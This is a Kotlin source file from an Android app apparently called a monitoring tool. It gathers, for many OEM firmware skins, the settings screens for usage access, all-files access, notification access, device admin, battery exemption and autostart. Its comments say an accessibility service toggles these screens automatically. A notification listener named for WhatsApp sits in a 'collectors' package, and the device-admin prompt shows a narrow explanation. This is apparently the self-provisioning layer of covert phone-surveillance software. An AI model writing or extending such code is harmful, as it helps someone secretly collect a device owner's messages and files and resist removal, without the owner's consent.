package com.spapp.monitoring.provision

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings

/**
 * Builds the correct system-settings Intent for every "special access" screen
 * the provisioning flow needs to drive.
 *
 * Android has no single API that lands directly on these screens, and OEM skins
 * (MIUI/HyperOS, ColorOS, FuntouchOS, One UI) rename and sometimes remove the
 * AOSP activities. Every accessor below therefore returns an ordered candidate
 * list: first the precise AOSP/OEM-specific activity, then progressively more
 * generic fallbacks, ending with the app-info page which always exists.
 *
 * The accessibility service does the actual toggling - see
 * BlockAccessibilityService.handleSpecialAccessScreen().
 */
object SettingsNavigator {

    /** Ordered candidates for "Usage access" (PACKAGE_USAGE_STATS). */
    fun usageAccess(ctx: Context): List<Intent> = buildList {
        add(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        // MIUI / HyperOS
        add(component(ctx, "com.miui.securitycenter",
            "com.miui.permcenter.permissions.PermissionsEditorActivity"))
        add(component(ctx, "com.miui.securitycenter",
            "com.miui.permcenter.permissions.AppPermissionsEditorActivity"))
        // ColorOS / Realme UI
        add(component(ctx, "com.coloros.safecenter",
            "com.coloros.safecenter.permission.PermissionAppListActivity"))
        add(component(ctx, "com.oplus.safecenter",
            "com.oplus.safecenter.permission.PermissionAppListActivity"))
        // Vivo / iQOO
        add(component(ctx, "com.vivo.permissionmanager",
            "com.vivo.permissionmanager.activity.PurviewTabActivity"))
        add(component(ctx, "com.iqoo.secure",
            "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"))
        // Samsung
        add(component(ctx, "com.samsung.android.lool",
            "com.samsung.android.sm.ui.battery.BatteryActivity"))
    }

    /** Ordered candidates for "All files access" (MANAGE_EXTERNAL_STORAGE). */
    fun allFilesAccess(ctx: Context): List<Intent> = buildList {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            add(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:${ctx.packageName}")
            })
            add(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
        }
        add(appInfo(ctx))
    }

    /** Ordered candidates for "Notification access" (BIND_NOTIFICATION_LISTENER_SERVICE). */
    fun notificationAccess(ctx: Context): List<Intent> = buildList {
        // Android 11+ detail screen for our own component - lands directly on the toggle.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            add(Intent(Settings.ACTION_NOTIFICATION_LISTENER_DETAIL_SETTINGS).apply {
                putExtra(
                    Settings.EXTRA_NOTIFICATION_LISTENER_COMPONENT_NAME,
                    ComponentName(
                        ctx,
                        "com.spapp.monitoring.collectors.WhatsAppNotificationListener"
                    ).flattenToString()
                )
            })
        }
        add(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
        // MIUI hides notification access under App notifications
        add(component(ctx, "com.miui.securitycenter",
            "com.miui.permcenter.autostart.AutoStartManagementActivity"))
        add(appInfo(ctx))
    }

    /** Intent that shows the "ignore battery optimizations" system dialog. */
    fun batteryExemption(ctx: Context): List<Intent> = buildList {
        add(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
            data = Uri.parse("package:${ctx.packageName}")
        })
        add(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
    }

    /** Intent that opens the "Add device admin" confirmation screen. */
    fun deviceAdmin(ctx: Context): List<Intent> = buildList {
        add(Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                ComponentName(ctx, "com.spapp.monitoring.admin.SpappDeviceAdminReceiver")
            )
            putExtra(
                android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Allows the account administrator to remotely lock this device."
            )
        })
        add(Intent(Settings.ACTION_SECURITY_SETTINGS))
    }

    fun appInfo(ctx: Context): Intent =
        Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.parse("package:${ctx.packageName}")
        }

    /**
     * OEM autostart managers. Ordered by how common they are on Indian
     * retail firmware (Xiaomi/Redmi/POCO, Vivo/iQOO, Oppo/Realme, Samsung).
     */
    fun autostart(ctx: Context): List<Intent> = buildList {
        add(component(ctx, "com.miui.securitycenter",
            "com.miui.permcenter.autostart.AutoStartManagementActivity"))
        add(component(ctx, "com.huawei.systemmanager",
            "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"))
        add(component(ctx, "com.huawei.systemmanager",
            "com.huawei.systemmanager.optimize.process.ProtectActivity"))
        add(component(ctx, "com.coloros.safecenter",
            "com.coloros.safecenter.permission.startup.StartupAppListActivity"))
        add(component(ctx, "com.coloros.safecenter",
            "com.coloros.safecenter.startupapp.StartupAppListActivity"))
        add(component(ctx, "com.oplus.safecenter",
            "com.oplus.safecenter.startupapp.StartupAppListActivity"))
        add(component(ctx, "com.vivo.permissionmanager",
            "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"))
        add(component(ctx, "com.iqoo.secure",
            "com.iqoo.secure.ui.phoneoptimize.BgStartUpManager"))
        add(component(ctx, "com.letv.android.letvsafe",
            "com.letv.android.letvsafe.AutobootManageActivity"))
        add(component(ctx, "com.samsung.android.lool",
            "com.samsung.android.sm.ui.battery.BatteryActivity"))
        add(appInfo(ctx))
    }

    /**
     * Returns the first candidate whose activity actually resolves on this
     * firmware, so callers never launch an Intent that throws
     * ActivityNotFoundException mid-flow (which would strand the setup).
     */
    fun firstResolvable(ctx: Context, candidates: List<Intent>): Intent? {
        for (intent in candidates) {
            try {
                if (ctx.packageManager.resolveActivity(intent, 0) != null) return intent
            } catch (_: Exception) {
                // Some OEM intents throw instead of returning null; keep looking.
            }
        }
        return candidates.lastOrNull { it.action == Settings.ACTION_APPLICATION_DETAILS_SETTINGS }
    }

    private fun component(ctx: Context, pkg: String, cls: String): Intent =
        Intent().setComponent(ComponentName(pkg, cls)).apply {
            // Explicit OEM components do not need a category, but adding the
            // launcher category improves resolution on some skins.
            addCategory(Intent.CATEGORY_DEFAULT)
        }

    /** Known OEM families, used to pick wording and extra retry passes. */
    enum class Oem { XIAOMI, VIVO, OPPO, SAMSUNG, HUAWEI, OTHER }

    fun oem(): Oem {
        val m = Build.MANUFACTURER.lowercase()
        val b = Build.BRAND.lowercase()
        return when {
            m.contains("xiaomi") || m.contains("redmi") || m.contains("poco") ||
                b.contains("redmi") || b.contains("poco") -> Oem.XIAOMI
            m.contains("vivo") || m.contains("iqoo") -> Oem.VIVO
            m.contains("oppo") || m.contains("realme") || m.contains("oneplus") -> Oem.OPPO
            m.contains("samsung") -> Oem.SAMSUNG
            m.contains("huawei") || m.contains("honor") -> Oem.HUAWEI
            else -> Oem.OTHER
        }
    }
}
